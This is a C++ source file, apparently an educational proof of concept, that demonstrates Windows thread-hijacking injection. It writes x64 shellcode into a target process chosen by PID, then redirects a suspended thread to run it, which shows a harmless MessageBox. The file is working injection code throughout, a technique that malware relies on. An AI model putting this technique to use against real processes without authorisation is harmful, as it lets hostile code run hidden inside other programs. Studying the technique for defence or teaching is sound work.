// This process attempts to use a hijacked thread to run shellcode inside a target process which pops a MessageBox.

#include <Windows.h>
#include <iostream>
#include <string>
#include <TlHelp32.h>
#include <assert.h>

HANDLE g_hProcess = NULL;

#define HIDWORD(x) (x >> 32)
#define LODWORD(x) (x & 0xFFFFFFFF)

// Function in shellcode.asm

#ifdef _WIN64
static const BYTE ShellcodeBytes[] =
"\x48\x83\xEC\x08\xC7\x04\x24\xCC\xCC\xCC\xCC\xC7\x44\x24\x04\xCC\xCC\xCC\xCC\x9C\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52"
"\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x48\x83\xEC\x08\x48\x89\x04\x24\x48\x33\xC9\x48\x8D"
"\x50\x08\x4C\x8D\x40\x1C\x4D\x33\xC9\x48\x83\xEC\x08\xFF\x10\x48\x83\xC4\x08\x48\x8B\x04\x24\x48\xC7\x00\x00\x00\x00\x00\x48\x83\xC4"
"\x08\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x5B\x5A\x59\x58\x9D\xC3";
#endif

using fMessageBoxA = int(WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

struct SC_PARAM
{
	fMessageBoxA MsgBox = nullptr;
	char Text[20]{};
	char Caption[20]{};
};

void HijackThread(DWORD Pid, UINT_PTR ShellcodeAddress, UINT_PTR ShellcodeParams)
{
	// Getting a snapshot of the threads running on the system.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	THREADENTRY32 ThreadEntry = {};
	ThreadEntry.dwSize = sizeof(THREADENTRY32);

	// Iterating through the threads until we find a thread from the target process.
	Thread32First(hSnapshot, &ThreadEntry);
	while (ThreadEntry.th32OwnerProcessID != Pid)
	{
		if (!Thread32Next(hSnapshot, &ThreadEntry))
		{
			printf("Thread32Next failed, err: 0x%X\n", GetLastError());

			CloseHandle(hSnapshot);
			return;
		}
	}

	CloseHandle(hSnapshot);

	// Getting a handle to the found thread.
	HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ThreadEntry.th32ThreadID);
	if (!hThread)
	{
		printf("OpenThread failed, err: 0x%X\n", GetLastError());
		return;
	}

	// Setting up a CONTEXT structure to be used while getting the thread context, CONTEXT_CONTROL meaning
	// we will only work on RIP, etc.
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_CONTROL;

	// Suspending the thread because if we change the thread context while it's running it can result in undefined behaviour.
	if (SuspendThread(hThread) == HandleToULong(INVALID_HANDLE_VALUE))
	{
		printf("SuspendThread failed, err: 0x%X\n", GetLastError());
		CloseHandle(hThread);
		return;
	}
	
	// Getting the thread context.
	if (GetThreadContext(hThread, &ThreadContext))
	{
		// Saving the RIP since we are gonna return the thread after the shellcode is executed.
		UINT_PTR JmpBackAddr = ThreadContext.Rip;

		DWORD LoJmpBk = LODWORD(JmpBackAddr);
		DWORD HiJmpBk = HIDWORD(JmpBackAddr);

		// Writing the JmpBackAddr into the
		// mov dword ptr [rsp], 0CCCCCCCCh
		// mov dword ptr[rsp + 4], 0CCCCCCCCh
		// corresponding bytes ( CC ) and then when the shellcode is executed, it will get itself some stack space and write the
		// return address in there, when ret is called after all it pops the stack and returns to what was on top of
		// the stack which is that address.
		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 7), &LoJmpBk, sizeof(DWORD), NULL);
		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 15), &HiJmpBk, sizeof(DWORD), NULL);

		// Writing the ShellcodeParams into the
		// mov rax, 0CCCCCCCCCCCCCCCCh
		// corresponding bytes ( CC ) which gets moved into rax and the shellcode uses rax as the base for the parameters.
		DWORD64 Buffer64 = ShellcodeParams;
		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 45), &Buffer64, sizeof(DWORD64), NULL);

		// Updating the RIP to ShellcodeAddress
#ifdef _WIN64
		ThreadContext.Rip = (DWORD64)ShellcodeAddress;
#else
		ThreadContext.Eip = ShellcodeAddress;
		ThreadContext.Ecx = ShellcodeAddress;
#endif

		// Setting the updated thread context.
		if (!SetThreadContext(hThread, &ThreadContext))
			printf("SetThreadContext failed, err: 0x%X\n", GetLastError());
	}
	else
		printf("GetThreadContext failed, err: 0x%X\n", GetLastError());

	// Resuming the thread with the updated RIP making the shellcode get executed IF the thread was already in a execute state when it was suspended,
	// if not, the thread will stay in it's suspend state.
	if (ResumeThread(hThread) == HandleToULong(INVALID_HANDLE_VALUE))
	{
		printf("ResumeThread failed, err: 0x%X\n", GetLastError());
		return;
	}

	// The shellcode updates the first param to 0 if it's done, so we stay in a loop until it's 0.
	UINT_PTR ThreadFinish = 0;
	while (ReadProcessMemory(g_hProcess, (LPVOID)(ShellcodeParams), &ThreadFinish, sizeof(UINT_PTR), NULL), ThreadFinish)
		;

	// Finally closing the thread handle.
	CloseHandle(hThread);
}

int main(int argc, char* argv[])
{
	// Checking for arguments.
	if (argc != 2)
	{
		std::string Filename = argv[0];
		printf("Invalid arguments\nUsage: %s PID\n", Filename.substr(Filename.find_last_of("/\\") + 1).c_str());
		return 0;
	}

	// Converting string pid to integer pid.
	DWORD Pid = atoi(argv[1]);
	if (!Pid)
	{
		printf("Invalid PID\n");
		return 0;
	}

	// Getting a handle to the target process so we can access it.
	g_hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
	if (!g_hProcess)
	{
		printf("[!] OpenProcess failed. Err code: 0x%X\n", GetLastError());
		return 0;
	}
	printf("[*] Retrieved handle for target process, 0x%X\n", HandleToULong(g_hProcess));

	// Allocating memory for our shellcode function + variables.
	PVOID ShellcodeMemory = VirtualAllocEx(g_hProcess, NULL, sizeof(ShellcodeBytes) + sizeof(SC_PARAM), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShellcodeMemory)
	{
		printf("[!] VirtualAllocEx failed. Err code: 0x%X\n", GetLastError());
		return 0;
	}
	printf("[*] %i bytes of memory allocated inside target process [%p].\n", sizeof(ShellcodeBytes) + sizeof(SC_PARAM), ShellcodeMemory);

	do
	{
		// Writing our shellcode into the allocated memory, since this memory is in the target process we must call WriteProcessMemory.
		SIZE_T NumberOfBytesWritten = 0;
		if (!WriteProcessMemory(g_hProcess, ShellcodeMemory, ShellcodeBytes, sizeof(ShellcodeBytes), &NumberOfBytesWritten))
		{
			printf("[!] WriteProcessMemory failed. Err code: 0x%X\n", GetLastError());
			break;
		}
		printf("[*] shellcode function written into the allocated memory.\n");

		// Setting up the Shellcode params.

		// This shellcode will be inside the target process so we can't just directly call MessageBoxA, we can't even directly pass string literals to any function inside since
		// those string literals will be allocated inside our process.

		SC_PARAM ScParam = {};

		// Getting USER32.DLL handle.
		HMODULE User32Module = LoadLibraryA("USER32.DLL");
		if (!User32Module)
		{
			printf("[!] USER32.DLL couldn't be loaded.\n");
			break;
		}

		// Getting the address of USER32.MessageBoxA, as I said we can't directly call it but if we pass it's address we can.
		ScParam.MsgBox = (fMessageBoxA)GetProcAddress(User32Module, "MessageBoxA");
		if (!ScParam.MsgBox)
		{
			printf("[!] USER32.MessageBoxA couldn't be found.\n");
			break;
		}

		// Copying our "Hi there!" string into the ScParam.Text member.
		const char* Text = "Hi there!";
		memcpy(ScParam.Text, Text, strlen(Text) + 1);

		// Copying our "THREAD HIJACK" string into the ScParam.Caption member.
		const char* Caption = "THREAD HIJACK";
		memcpy(ScParam.Caption, Caption, strlen(Caption) + 1);

		// Writing variables just after the shellcode function so we can access them inside the target process.
		if (!WriteProcessMemory(g_hProcess, (BYTE*)ShellcodeMemory + sizeof(ShellcodeBytes), &ScParam, sizeof(SC_PARAM), &NumberOfBytesWritten))
		{
			printf("[!] WriteProcessMemory failed. Err code: 0x%X\n", GetLastError());
			break;
		}
		printf("[*] shellcode variables written into the allocated memory.\n");
		
		HijackThread(Pid, (UINT_PTR)ShellcodeMemory, (UINT_PTR)ShellcodeMemory + sizeof(ShellcodeBytes));

		printf("[*] shellcode function finished.\n");
	} while (FALSE);

	// Freeing the entire allocated Shellcode memory.
	if (!VirtualFreeEx(g_hProcess, ShellcodeMemory, 0, MEM_RELEASE))
	{
		printf("[!] VirtualFreeEx failed. Err code: 0x%X\n", GetLastError());
		return 0;
	}
	printf("[*] Allocated memory released.\n");

	CloseHandle(g_hProcess);
	printf("[*] Process handle released.\n");
}